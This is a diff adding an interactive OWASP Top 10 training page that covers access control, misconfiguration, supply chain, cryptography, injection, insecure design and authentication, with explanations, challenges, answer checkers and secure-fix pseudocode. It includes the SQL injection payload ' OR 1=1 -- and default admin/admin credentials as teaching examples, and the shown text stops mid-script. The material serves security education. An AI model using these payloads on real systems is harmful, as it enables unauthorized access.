@@ -1,0 +1,1290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Break It. Understand It. Fix It.</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07090f;--bg2:#0d1018;--bg3:#121620;--bg4:#181d28;--bg5:#1e2535;
+  --bdr:#1c2236;--bdr2:#252e44;--bdr3:#2e3a54;
+  --text:#dde4f0;--text2:#8d9ab8;--text3:#556080;--text4:#3a4660;
+  --green:#2ecc8a;--green2:#1a9962;--green3:#0d4d31;
+  --red:#e84040;--red2:#a82020;--red3:#3d0e0e;
+  --amber:#f0a030;--amber2:#a86e10;--amber3:#3d2800;
+  --blue:#4a9eff;--blue2:#1a5cbf;--blue3:#0a1f4d;
+  --purple:#9b6bff;--cyan:#00d4e0;
+  --mono:'IBM Plex Mono',monospace;
+  --sans:'Syne',sans-serif;
+}
+html{scroll-behavior:smooth}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:100vh;line-height:1.6}
+
+/* ===== HOMEPAGE ===== */
+#home{min-height:100vh;display:flex;flex-direction:column}
+
+.hero{padding:80px 40px 48px;text-align:center;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 60% 40% at 50% 0%,rgba(46,204,138,.06),transparent);pointer-events:none}
+.hero-badge{display:inline-flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11px;color:var(--green);border:1px solid var(--green3);background:rgba(46,204,138,.06);padding:5px 12px;border-radius:20px;margin-bottom:24px;letter-spacing:.5px}
+.hero-badge::before{content:'';width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.hero h1{font-size:clamp(32px,5vw,56px);font-weight:800;line-height:1.1;letter-spacing:-1px;color:#fff;margin-bottom:12px}
+.hero h1 span{color:var(--green)}
+.hero-sub{font-size:clamp(14px,2vw,18px);color:var(--text2);margin-bottom:10px;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
+.hero-desc{font-size:14px;color:var(--text3);max-width:520px;margin:0 auto 40px;line-height:1.8}
+
+.vuln-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;padding:0 40px 60px;max-width:1200px;margin:0 auto;width:100%}
+
+.vcard{background:var(--bg3);border:1px solid var(--bdr);border-radius:10px;padding:16px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.vcard::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:transparent;transition:background .2s}
+.vcard:hover{border-color:var(--bdr3);background:var(--bg4);transform:translateY(-2px)}
+.vcard:hover::after{background:var(--green)}
+.vcard.selected{border-color:var(--green2);background:var(--bg4)}
+.vcard.selected::after{background:var(--green)}
+.vcard-badge{font-family:var(--mono);font-size:10px;font-weight:600;color:var(--green);background:var(--green3);padding:3px 8px;border-radius:4px;display:inline-block;margin-bottom:10px}
+.vcard h3{font-size:14px;font-weight:700;color:var(--text);margin-bottom:4px}
+.vcard p{font-size:11px;color:var(--text3);line-height:1.5}
+.vcard-arrow{position:absolute;right:14px;top:50%;transform:translateY(-50%);color:var(--text4);font-size:16px;transition:all .2s}
+.vcard:hover .vcard-arrow{color:var(--green);transform:translateY(-50%) translateX(2px)}
+
+.start-btn{display:block;margin:0 40px 80px;max-width:300px;margin-left:auto;margin-right:auto;padding:14px 32px;background:var(--green);color:#000;font-family:var(--sans);font-size:15px;font-weight:700;border:none;border-radius:8px;cursor:pointer;transition:all .2s;letter-spacing:.5px}
+.start-btn:hover{background:var(--green2);color:#fff;transform:translateY(-1px)}
+.start-btn:disabled{background:var(--bg4);color:var(--text4);cursor:not-allowed;transform:none}
+
+/* ===== LAB PAGE ===== */
+#lab{display:none;min-height:100vh;flex-direction:column}
+
+.lab-nav{background:var(--bg2);border-bottom:1px solid var(--bdr);padding:0;display:flex;align-items:stretch;position:sticky;top:0;z-index:100}
+.lab-back{padding:14px 20px;font-size:12px;color:var(--text3);cursor:pointer;border-right:1px solid var(--bdr);display:flex;align-items:center;gap:6px;transition:color .15s;background:none;border-top:none;border-bottom:none;border-left:none;font-family:var(--sans)}
+.lab-back:hover{color:var(--green)}
+.lab-info{padding:14px 20px;flex:1}
+.lab-info-badge{font-family:var(--mono);font-size:10px;color:var(--green);margin-bottom:2px}
+.lab-info-title{font-size:14px;font-weight:700;color:var(--text)}
+.lab-progress{display:flex;align-items:center;gap:4px;padding:14px 20px}
+.prog-dot{width:8px;height:8px;border-radius:50%;background:var(--bdr3);transition:background .3s}
+.prog-dot.active{background:var(--green)}
+.prog-dot.done{background:var(--green2)}
+
+.lab-body{flex:1;display:grid;grid-template-columns:1fr;gap:0}
+
+/* SECTION TABS */
+.section-tabs{display:flex;border-bottom:1px solid var(--bdr);overflow-x:auto;background:var(--bg2)}
+.stab{padding:14px 20px;font-size:12px;font-weight:600;color:var(--text3);cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none;font-family:var(--sans);display:flex;align-items:center;gap:6px;letter-spacing:.3px}
+.stab:hover{color:var(--text2)}
+.stab.active{color:var(--text);border-bottom-color:var(--green)}
+.stab-num{font-family:var(--mono);font-size:9px;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:var(--bdr3);color:var(--text3)}
+.stab.active .stab-num{background:var(--green);color:#000}
+.stab.done .stab-num{background:var(--green3);color:var(--green)}
+
+.section-content{padding:32px 40px;max-width:860px;margin:0 auto;width:100%;animation:fadein .2s ease}
+@keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+
+/* SECTION HEADERS */
+.sec-title{font-size:22px;font-weight:800;color:#fff;margin-bottom:6px}
+.sec-sub{font-size:13px;color:var(--text3);margin-bottom:28px}
+
+/* INFO BOXES */
+.info-card{background:var(--bg3);border:1px solid var(--bdr);border-radius:8px;padding:20px 24px;margin-bottom:16px}
+.info-label{font-size:10px;font-weight:700;color:var(--amber);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;font-family:var(--mono)}
+.info-text{font-size:13px;color:var(--text2);line-height:1.8}
+.info-text strong{color:var(--text)}
+.info-highlight{background:var(--bg4);border:1px solid var(--bdr2);border-radius:6px;padding:14px 18px;font-family:var(--mono);font-size:12px;color:var(--cyan);margin-top:12px;line-height:1.7}
+.highlight-red{color:var(--red)}
+.highlight-green{color:var(--green)}
+.highlight-amber{color:var(--amber)}
+
+/* TERMINAL */
+.terminal{background:#040608;border:1px solid var(--bdr);border-radius:8px;overflow:hidden;margin-bottom:16px}
+.term-hdr{background:var(--bg4);padding:8px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--bdr)}
+.tdot{width:10px;height:10px;border-radius:50%}
+.term-title{font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:4px}
+.term-body{padding:16px;font-family:var(--mono);font-size:12px;line-height:2}
+.t-prompt{color:var(--green);margin-right:4px}
+.t-cmd{color:var(--text)}
+.t-key{color:var(--cyan)}
+.t-val{color:var(--amber)}
+.t-ok{color:var(--green)}
+.t-err{color:var(--red)}
+.t-cmt{color:var(--text3)}
+.t-url{color:var(--blue)}
+
+/* INPUTS */
+.sim-row{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
+.sim-input{background:var(--bg3);border:1px solid var(--bdr2);border-radius:6px;padding:10px 14px;color:var(--amber);font-family:var(--mono);font-size:13px;outline:none;transition:border-color .2s;flex:1;min-width:0}
+.sim-input:focus{border-color:var(--amber)}
+.sim-input::placeholder{color:var(--text4)}
+
+/* BUTTONS */
+.btn{padding:10px 20px;border-radius:6px;border:none;cursor:pointer;font-size:13px;font-weight:700;font-family:var(--sans);transition:all .15s;letter-spacing:.3px;white-space:nowrap}
+.btn-red{background:var(--red2);color:#fff}
+.btn-red:hover{background:var(--red)}
+.btn-green{background:var(--green3);color:var(--green);border:1px solid var(--green2)}
+.btn-green:hover{background:rgba(46,204,138,.15)}
+.btn-amber{background:var(--amber3);color:var(--amber);border:1px solid var(--amber2)}
+.btn-amber:hover{background:rgba(240,160,48,.12)}
+.btn-gray{background:var(--bg4);color:var(--text2);border:1px solid var(--bdr2)}
+.btn-gray:hover{background:var(--bg5);color:var(--text)}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+
+/* RESULT */
+.result{border-radius:8px;padding:14px 18px;font-family:var(--mono);font-size:12px;line-height:1.8;margin-top:14px;display:none;animation:fadein .2s ease}
+.result.show{display:block}
+.result.success{background:rgba(46,204,138,.07);border:1px solid var(--green2);color:var(--green)}
+.result.fail{background:var(--red3);border:1px solid var(--red2);color:var(--red)}
+.result.info{background:var(--blue3);border:1px solid var(--blue2);color:var(--blue)}
+.result.warn{background:var(--amber3);border:1px solid var(--amber2);color:var(--amber)}
+
+/* TOGGLE */
+.tog-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--bdr)}
+.tog-label{font-size:13px;color:var(--text2)}
+.tog{position:relative;width:38px;height:22px}
+.tog input{opacity:0;width:0;height:0;position:absolute}
+.tog-track{position:absolute;inset:0;background:var(--bdr3);border-radius:11px;cursor:pointer;transition:.2s}
+.tog-track::before{content:'';position:absolute;height:16px;width:16px;left:3px;top:3px;background:var(--text3);border-radius:50%;transition:.2s}
+.tog input:checked+.tog-track{background:var(--green2)}
+.tog input:checked+.tog-track::before{transform:translateX(16px);background:var(--green)}
+
+/* CHALLENGE */
+.challenge-box{background:var(--bg3);border:1px solid var(--bdr2);border-radius:10px;padding:24px;margin-bottom:20px}
+.challenge-task{font-size:14px;color:var(--text);line-height:1.8;margin-bottom:20px}
+.challenge-task::before{content:'Task: ';color:var(--amber);font-weight:700;font-family:var(--mono)}
+.answer-row{display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap}
+.answer-input{flex:1;min-width:0;background:var(--bg4);border:1px solid var(--bdr2);border-radius:6px;padding:10px 14px;color:var(--text);font-family:var(--sans);font-size:13px;outline:none;resize:vertical;min-height:60px}
+.answer-input:focus{border-color:var(--blue2)}
+.check-result{padding:12px 16px;border-radius:6px;font-size:13px;line-height:1.6;margin-top:12px;display:none}
+.check-result.show{display:block}
+.check-result.correct{background:rgba(46,204,138,.07);border:1px solid var(--green2);color:var(--green)}
+.check-result.partial{background:var(--amber3);border:1px solid var(--amber2);color:var(--amber)}
+.check-result.wrong{background:var(--red3);border:1px solid var(--red2);color:var(--red)}
+.hint-btn{font-size:11px;color:var(--text3);cursor:pointer;background:none;border:none;font-family:var(--sans);margin-top:8px;display:inline-block}
+.hint-btn:hover{color:var(--text2)}
+.hint-text{display:none;font-size:12px;color:var(--text3);margin-top:8px;padding:10px;background:var(--bg4);border-radius:6px;font-style:italic;line-height:1.6}
+.hint-text.show{display:block}
+
+/* CODE BLOCK */
+.code-block{background:#040608;border:1px solid var(--bdr);border-radius:8px;padding:18px;font-family:var(--mono);font-size:12px;line-height:2;overflow-x:auto;margin-bottom:16px}
+.kw{color:var(--purple)}.fn{color:var(--cyan)}.str{color:var(--amber)}.cmt{color:var(--text3)}.var{color:var(--green)}.num{color:var(--blue)}
+
+.defense-point{display:flex;gap:12px;margin-bottom:12px;font-size:13px;color:var(--text2);line-height:1.7}
+.defense-point::before{content:'▸';color:var(--green);font-size:14px;margin-top:2px;flex-shrink:0}
+
+/* SECTION NEXT */
+.sec-nav{display:flex;justify-content:space-between;align-items:center;margin-top:32px;padding-top:20px;border-top:1px solid var(--bdr)}
+.sec-nav-label{font-size:11px;color:var(--text3)}
+
+/* COMPARE TABLE */
+.compare{width:100%;border-collapse:collapse;font-size:12px;font-family:var(--mono);margin-bottom:16px}
+.compare th{background:var(--bg4);color:var(--text2);padding:10px 14px;text-align:left;border-bottom:1px solid var(--bdr2);font-weight:600}
+.compare td{padding:10px 14px;border-bottom:1px solid var(--bdr);color:var(--text3)}
+.compare tr:hover td{background:var(--bg3)}
+.compare .bad{color:var(--red)}
+.compare .good{color:var(--green)}
+
+/* STATUS STEPS */
+.flow-steps{display:flex;flex-direction:column;gap:0;margin-bottom:16px}
+.flow-step{display:flex;align-items:center;gap:12px;padding:10px 14px;border-left:2px solid var(--bdr2);font-size:12px;color:var(--text3);transition:all .3s;margin-left:10px}
+.flow-step.active{border-left-color:var(--red);color:var(--red);background:var(--red3)}
+.flow-step.secure{border-left-color:var(--green2);color:var(--green);background:rgba(46,204,138,.05)}
+.flow-step-num{font-family:var(--mono);font-size:10px;min-width:20px}
+
+/* BRUTE FORCE LOG */
+#brute-log{max-height:120px;overflow-y:auto;font-family:var(--mono);font-size:11px;line-height:1.8;background:#040608;border:1px solid var(--bdr);border-radius:6px;padding:10px;margin-bottom:10px}
+#brute-log div{animation:fadein .1s ease}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--bdr3);border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--bdr2)}
+
+/* RESPONSIVE */
+@media(max-width:640px){
+  .hero{padding:48px 20px 32px}
+  .vuln-grid{padding:0 16px 40px;grid-template-columns:1fr 1fr}
+  .section-content{padding:20px}
+  .start-btn{margin:0 16px 48px}
+  .sim-row{flex-direction:column}
+  .sim-input,.btn{width:100%}
+}
+</style>
+</head>
+<body>
+
+<!-- ===== HOME ===== -->
+<div id="home">
+  <div class="hero">
+    <div class="hero-badge">🔒 Security Education Platform</div>
+    <h1>OWASP Top 10<br><span>Web Vulnerabilities</span></h1>
+    <div class="hero-sub">Break It. Understand It. Fix It.</div>
+    <p class="hero-desc">Learn the most critical web security risks through real-world simulations and hands-on challenges.</p>
+  </div>
+
+  <div class="vuln-grid" id="vuln-grid"></div>
+
+  <button class="start-btn" id="start-btn" disabled onclick="startLab()">
+    Select a vulnerability to begin →
+  </button>
+</div>
+
+<!-- ===== LAB ===== -->
+<div id="lab" style="display:none">
+  <nav class="lab-nav">
+    <button class="lab-back" onclick="goHome()">← Back</button>
+    <div class="lab-info">
+      <div class="lab-info-badge" id="lab-badge">A01</div>
+      <div class="lab-info-title" id="lab-title">Broken Access Control</div>
+    </div>
+    <div class="lab-progress" id="lab-progress"></div>
+  </nav>
+
+  <div class="section-tabs">
+    <button class="stab active" onclick="showTab(0)" id="tab-0"><span class="stab-num">1</span> Explanation</button>
+    <button class="stab" onclick="showTab(1)" id="tab-1"><span class="stab-num">2</span> Simulation</button>
+    <button class="stab" onclick="showTab(2)" id="tab-2"><span class="stab-num">3</span> Challenge</button>
+    <button class="stab" onclick="showTab(3)" id="tab-3"><span class="stab-num">4</span> Fix It</button>
+  </div>
+
+  <div id="tab-content-0" class="section-content"></div>
+  <div id="tab-content-1" class="section-content" style="display:none"></div>
+  <div id="tab-content-2" class="section-content" style="display:none"></div>
+  <div id="tab-content-3" class="section-content" style="display:none"></div>
+</div>
+
+<script>
+const VULNS = [
+  {
+    badge:'A01',name:'Broken Access Control',short:'IDOR',
+    tagline:'Users access data they shouldn\'t see',
+    explanation:{
+      what:'A user can access or modify another user\'s data simply by changing a parameter — because the server never checks ownership.',
+      example:'User A is logged in. Their profile URL is /profile?id=101. By changing id=101 to id=102, they see User B\'s private data.',
+      where:'Any endpoint where user-supplied IDs are used to fetch data, without verifying the requesting user owns that data.'
+    },
+    challenge:{
+      task:'Use the simulation to access another user\'s profile. Then answer: Which user IDs did you discover data for? What did the server NOT check?',
+      hints:['Try changing the ID in the input field','The server only checks if you are logged in, not if the data belongs to you','IDs 102, 103, and 104 belong to other users'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasId = /10[2-4]/.test(a)||a.includes('102')||a.includes('103')||a.includes('104');
+        const hasReason = a.includes('own')||a.includes('check')||a.includes('authori')||a.includes('verif')||a.includes('session')||a.includes('belong');
+        if(hasId&&hasReason) return {grade:'correct',msg:"Correct! You identified the vulnerability (changed an ID and got someone else's data) and the root cause (no ownership check). That's IDOR in a nutshell."};
+        if(hasId) return {grade:'partial',msg:"You found the right IDs — but also explain WHY it worked. What did the server fail to check?"};
+        return {grade:'wrong',msg:"Try using the simulation first. Change the ID field to 102, 103, or 104 and observe the response."};
+      }
+    },
+    fix:{
+      summary:'On every data request, the server must verify that the authenticated user actually owns the requested resource.',
+      pseudo:`<span class="cmt"># VULNERABLE — trusts the user's input</span>
+<span class="kw">def</span> <span class="fn">get_profile</span>(requested_id):
+    <span class="kw">return</span> db.get_user(requested_id)  <span class="cmt"># no check!</span>
+
+<span class="cmt"># SECURE — server enforces ownership</span>
+<span class="kw">def</span> <span class="fn">get_profile</span>(requested_id, session):
+    <span class="kw">if</span> session.user_id != requested_id:
+        <span class="kw">raise</span> <span class="fn">HTTP_403_Forbidden</span>()
+    <span class="kw">return</span> db.get_user(requested_id)`,
+      points:['Never trust client-supplied IDs for authorization decisions','Always cross-check the requested resource owner against the session user','Use indirect reference maps (tokens) instead of direct database IDs','Apply authorization checks at the server, never the client']
+    }
+  },
+  {
+    badge:'A02',name:'Security Misconfiguration',short:'Misconfig',
+    tagline:'Insecure defaults leave the door wide open',
+    explanation:{
+      what:'The application uses default, weak, or overly permissive settings — making it trivially easy for attackers to break in.',
+      example:'An admin panel ships with username "admin" and password "admin". No one changed it. An attacker logs in immediately.',
+      where:'Admin portals, server configs, cloud storage buckets, debug endpoints, HTTP headers — anywhere defaults are left unchanged.'
+    },
+    challenge:{
+      task:'Log in to the admin panel in the simulation. What credentials worked? Why was this possible — what did the developers forget to do?',
+      hints:['Try the most common default admin credentials','Think about what a developer should do before deploying to production'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasCreds = (a.includes('admin')&&(a.includes('admin')||a.includes('password')))||a.includes('admin/admin')||a.includes('admin:admin');
+        const hasWhy = a.includes('default')||a.includes('change')||a.includes('produc')||a.includes('hardened')||a.includes('forgot');
+        if(hasCreds&&hasWhy) return {grade:'correct',msg:'Correct! Default credentials (admin/admin) were never changed before deployment. This is one of the most common and easily prevented vulnerabilities in real systems.'};
+        if(hasCreds) return {grade:'partial',msg:'You found the credentials. Now explain: what should the developers have done before going live?'};
+        return {grade:'wrong',msg:'Hint: Try "admin" as both username and password. Then think about why this worked on a real system.'};
+      }
+    },
+    fix:{
+      summary:'Harden every configuration before deployment. Remove defaults, disable what you don\'t need, and enforce secure settings.',
+      pseudo:`<span class="cmt"># Deployment checklist (pseudocode)</span>
+<span class="kw">assert</span> admin_password != <span class="str">"admin"</span>
+<span class="kw">assert</span> debug_mode == <span class="var">False</span>
+<span class="kw">assert</span> error_verbosity == <span class="str">"minimal"</span>
+<span class="kw">assert</span> unused_ports.is_empty()
+<span class="kw">assert</span> security_headers.are_set()`,
+      points:['Change ALL default credentials before going live','Disable debug mode and verbose error messages in production','Remove unused features, default accounts, and sample apps','Set proper security headers (CSP, X-Frame-Options, HSTS)','Automate hardening checks in your deployment pipeline']
+    }
+  },
+  {
+    badge:'A03',name:'Software Supply Chain Failures',short:'SCA',
+    tagline:'Your dependencies can be your biggest backdoor',
+    explanation:{
+      what:'Your application imports third-party libraries. If one of those libraries is malicious, outdated, or compromised, attackers can exploit it to harm your users.',
+      example:'You install "lodahs" thinking it\'s a utility. It\'s actually a typosquatted package that runs malware on install.',
+      where:'npm packages, pip libraries, Maven dependencies, CDN scripts — any external code your app runs.'
+    },
+    challenge:{
+      task:'In the simulation, a vulnerable dependency is highlighted. Explain what makes it dangerous — what attack does it enable, and how should a developer have caught it?',
+      hints:['Look at the package name carefully — is it what it seems?','Think about what runs when you install a package (postinstall scripts)','Version pinning and hash verification help catch tampered packages'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasAttack = a.includes('malicious')||a.includes('backdoor')||a.includes('typo')||a.includes('script')||a.includes('postinstall')||a.includes('remote')||a.includes('code')||a.includes('rce');
+        const hasPrevention = a.includes('pin')||a.includes('hash')||a.includes('verify')||a.includes('audit')||a.includes('check')||a.includes('snyk')||a.includes('review')||a.includes('name');
+        if(hasAttack&&hasPrevention) return {grade:'correct',msg:'Exactly right. Typosquatted or compromised packages can run arbitrary code on install, and hash/version pinning with regular audits is how you prevent it.'};
+        if(hasAttack) return {grade:'partial',msg:'Good — you identified the attack. Now: how should developers have caught or prevented this?'};
+        return {grade:'wrong',msg:'Look at the package name in the simulation. What seems wrong? Think about what happens when a malicious package is installed.'};
+      }
+    },
+    fix:{
+      summary:'Treat every dependency as a potential risk. Pin versions, verify hashes, and audit regularly.',
+      pseudo:`<span class="cmt"># requirements.txt — VULNERABLE</span>
+requests        <span class="cmt"># any version, no verification</span>
+flask
+lodahs          <span class="cmt"># typosquatted malicious package!</span>
+
+<span class="cmt"># requirements.txt — SECURE</span>
+requests==<span class="num">2.31.0</span> --hash=sha256:abc123...
+flask==<span class="num">3.0.0</span> --hash=sha256:def456...
+<span class="cmt"># Scanned with: pip-audit, snyk</span>`,
+      points:['Pin all dependency versions explicitly','Use hash verification to detect tampered packages','Run dependency scanners (Snyk, Dependabot, pip-audit) regularly','Review new dependencies before adding them','Use a Software Bill of Materials (SBOM) for every release']
+    }
+  },
+  {
+    badge:'A04',name:'Cryptographic Failures',short:'Crypto',
+    tagline:'Storing secrets in the open',
+    explanation:{
+      what:'Sensitive data like passwords or credit cards is stored or transmitted without proper encryption — making leaks catastrophic.',
+      example:'The database stores passwords as MD5 hashes. When it leaks, all passwords are cracked in minutes using rainbow tables.',
+      where:'Password storage, payment data, health records, session tokens, API keys — any field that must remain secret.'
+    },
+    challenge:{
+      task:'Compare the two password storage methods in the simulation. Which one is secure and why? What makes MD5 unsuitable for storing passwords?',
+      hints:['MD5 is a hashing algorithm — but all hashing algorithms are not equal for passwords','Think about speed: fast hashing helps attackers, slow hashing protects you','Argon2 and bcrypt add "salt" and are deliberately slow'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasRight = a.includes('argon')||a.includes('bcrypt')||a.includes('scrypt')||a.includes('slow')||a.includes('salt')||a.includes('work factor');
+        const hasWrong = a.includes('md5')||a.includes('fast')||a.includes('rainbow')||a.includes('crack')||a.includes('broken')||a.includes('weak');
+        if(hasRight&&hasWrong) return {grade:'correct',msg:'Correct! MD5 is cryptographically broken and too fast — attackers can check billions of guesses per second. Argon2/bcrypt are purpose-built for passwords: slow, salted, and resistant to GPU attacks.'};
+        if(hasRight) return {grade:'partial',msg:'Good — you identified the secure option. But also explain what makes MD5 dangerous for password storage specifically.'};
+        return {grade:'wrong',msg:'Compare the two hashes in the simulation. Look up what makes a hashing algorithm suitable (or unsuitable) for storing passwords.'};
+      }
+    },
+    fix:{
+      summary:'Use algorithms designed for password storage. Never use MD5 or SHA1 for secrets. Encrypt sensitive data at rest and in transit.',
+      pseudo:`<span class="cmt"># VULNERABLE — MD5 is fast and broken</span>
+hashed = md5(user_password)
+
+<span class="cmt"># VULNERABLE — plain SHA1, no salt</span>
+hashed = sha1(user_password)
+
+<span class="cmt"># SECURE — Argon2id with cost factor</span>
+<span class="kw">from</span> argon2 <span class="kw">import</span> PasswordHasher
+ph = PasswordHasher(time_cost=<span class="num">3</span>, memory_cost=<span class="num">65536</span>)
+hashed = ph.hash(user_password)`,
+      points:['Use Argon2id, bcrypt, or scrypt for password hashing — never MD5 or SHA1','Always use HTTPS/TLS for data in transit — enforce it','Store only what you need — data minimization reduces breach impact','Rotate encryption keys and use a key management service']
+    }
+  },
+  {
+    badge:'A05',name:'Injection',short:'SQLi/XSS',
+    tagline:'User input that takes control of the system',
+    explanation:{
+      what:'Untrusted user input is embedded directly into a command or query. The interpreter executes the attacker\'s input as code.',
+      example:'A login form takes a username. Instead of a name, the attacker types: \' OR 1=1 -- which makes the SQL query always return true.',
+      where:'Login forms, search boxes, URL parameters, API inputs — anywhere user data is placed into a SQL query, shell command, or HTML without sanitization.'
+    },
+    challenge:{
+      task:'Use the login form simulation to bypass authentication without a real password. What exact input did you use, and explain what the injected SQL actually does.',
+      hints:["Try: ' OR 1=1 -- in the username field","The -- comment makes the rest of the query disappear","1=1 is always true, so WHERE 1=1 returns every row"],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasPayload = a.includes("or 1=1")||a.includes("or '1'='1")||a.includes("or1=1")||a.includes("always true")||a.includes("tautology");
+        const hasWhy = a.includes('comment')||a.includes('--')||a.includes('true')||a.includes('bypass')||a.includes('always')||a.includes('returns all')||a.includes('every row')||a.includes('1=1');
+        if(hasPayload&&hasWhy) return {grade:'correct',msg:"Nailed it. OR 1=1 creates a tautology (always-true condition) and -- comments out the rest, so the query returns all users and authentication is bypassed completely."};
+        if(hasPayload) return {grade:'partial',msg:'You found the payload! Now explain what it actually does to the SQL query — why does 1=1 bypass the password check?'};
+        return {grade:'wrong',msg:"Try entering  ' OR 1=1 --  in the username field of the simulation. Then explain what changed in the SQL query shown below."};
+      }
+    },
+    fix:{
+      summary:'Separate user data from the query structure. Parameterized queries make injection impossible — the database never interprets user input as SQL.',
+      pseudo:`<span class="cmt"># VULNERABLE — string concatenation</span>
+query = <span class="str">f"SELECT * FROM users WHERE name='{username}'"</span>
+
+<span class="cmt"># Input: ' OR 1=1 --</span>
+<span class="cmt"># Becomes: WHERE name='' OR 1=1 --'</span>
+
+<span class="cmt"># SECURE — parameterized query</span>
+query = <span class="str">"SELECT * FROM users WHERE name = ?"</span>
+cursor.execute(query, (username,))
+<span class="cmt"># Input is always treated as DATA, never SQL</span>`,
+      points:['Always use parameterized queries or prepared statements','Never concatenate user input into SQL strings','Use an ORM but still validate inputs — ORMs can be misused','Validate and whitelist input types where possible (numbers, emails, etc.)']
+    }
+  },
+  {
+    badge:'A06',name:'Insecure Design',short:'Logic',
+    tagline:'The architecture itself is the vulnerability',
+    explanation:{
+      what:'The application\'s workflow has no protection against users skipping required steps. The design never considered abuse cases.',
+      example:'A shopping site has 3 steps: cart → payment → confirm. A user goes directly to the confirm URL — and an order is placed for free.',
+      where:'Checkout flows, password reset flows, file uploads, multi-step forms — anywhere the server trusts the client to follow the correct sequence.'
+    },
+    challenge:{
+      task:'In the simulation, skip the payment step and place an order. Then explain: what should have been different in the design to prevent this?',
+      hints:['Think about who enforces the checkout flow — the client (browser) or the server?','The server should track what steps have been completed before allowing the next','A state machine approach ensures no step can be skipped'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasServer = a.includes('server')||a.includes('server-side')||a.includes('backend')||a.includes('state')||a.includes('session');
+        const hasFix = a.includes('check')||a.includes('verif')||a.includes('track')||a.includes('enforce')||a.includes('require')||a.includes('confirm')||a.includes('state machine');
+        if(hasServer&&hasFix) return {grade:'correct',msg:'Exactly. The server must enforce step completion — never trust the client to follow the intended flow. A server-side state machine that tracks "payment_confirmed" before allowing order placement is the correct design.'};
+        if(hasServer||hasFix) return {grade:'partial',msg:'You\'re on the right track. Be more specific: what should the server check before processing the order?'};
+        return {grade:'wrong',msg:'Think about this: when you clicked "Confirm Order" directly, what did the server NOT check? Who should be enforcing the order of steps?'};
+      }
+    },
+    fix:{
+      summary:'Business logic must be enforced server-side. The server must verify every prerequisite before allowing each step.',
+      pseudo:`<span class="cmt"># VULNERABLE — trusts client step order</span>
+<span class="kw">def</span> <span class="fn">confirm_order</span>(cart_id):
+    place_order(cart_id)  <span class="cmt"># no prerequisite check!</span>
+
+<span class="cmt"># SECURE — server-side state machine</span>
+<span class="kw">def</span> <span class="fn">confirm_order</span>(cart_id, session):
+    <span class="kw">if not</span> session.get(<span class="str">'payment_completed'</span>):
+        <span class="kw">raise</span> <span class="fn">BadRequest</span>(<span class="str">"Payment required first"</span>)
+    place_order(cart_id)`,
+      points:['Model business flows as server-side state machines','Store completion flags in the server session, not client data','Validate every step transition, not just the final action','Conduct threat modeling during design — ask "what if a user skips this?"']
+    }
+  },
+  {
+    badge:'A07',name:'Authentication Failures',short:'AuthN',
+    tagline:'Weak locks invite brute force',
+    explanation:{
+      what:'Authentication mechanisms are weak, unprotected, or poorly implemented — making it easy for attackers to guess or steal credentials.',
+      example:'A login endpoint has no rate limit. An attacker tries 10,000 passwords per second from a list of common passwords. One works.',
+      where:'Login forms, password reset flows, session tokens, API keys — anything that proves who a user is.'
+    },
+    challenge:{
+      task:'Use the simulation to brute-force the login (no rate limit is active). What password was found? What two protections would have stopped this attack?',
+      hints:['Let the simulation run — it tries a wordlist automatically','Rate limiting slows attackers; account lockout stops them entirely','Multi-factor authentication makes a correct password insufficient alone'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasPass = a.includes('letmein')||a.includes('password')||a.includes('123456')||a.includes('found')||a.includes('cracked')||a.includes('success');
+        const hasFix = (a.includes('rate')||a.includes('limit')||a.includes('lockout')||a.includes('mfa')||a.includes('multi')||a.includes('2fa'));
+        const hasTwoFixes = ((a.includes('rate')||a.includes('limit'))&&(a.includes('lockout')||a.includes('mfa')||a.includes('multi')))||
+                            (a.includes('lockout')&&a.includes('mfa'));
+        if(hasPass&&hasTwoFixes) return {grade:'correct',msg:'Perfect. "letmein" was the password. Rate limiting slows guessing (e.g. 5 attempts/minute), account lockout stops it after N failures, and MFA makes the password useless alone.'};
+        if(hasPass&&hasFix) return {grade:'partial',msg:'Good — you found the password. Now name TWO specific protections that would prevent this kind of attack.'};
+        if(hasPass) return {grade:'partial',msg:'You found the password. Now answer: what two security controls would have stopped this brute force attack?'};
